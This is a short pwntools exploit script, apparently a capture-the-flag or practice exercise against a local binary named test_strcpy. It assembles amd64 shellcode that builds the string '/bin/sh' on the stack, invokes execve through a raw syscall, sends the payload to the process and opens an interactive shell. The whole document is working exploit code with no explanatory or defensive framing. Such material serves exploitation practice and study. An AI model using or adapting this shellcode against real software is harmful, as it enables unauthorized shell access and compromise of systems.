from pwn import *

context.arch = 'amd64'

io = process('./test_strcpy')
#gdb.attach(io)

shellcode = '''
mov rax, %d
shr rax, 8
push rax

mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
xor rax, rax
mov al, 0x3b
syscall
''' % u64('a/bin/sh')

io.sendline(asm(shellcode))

io.interactive()
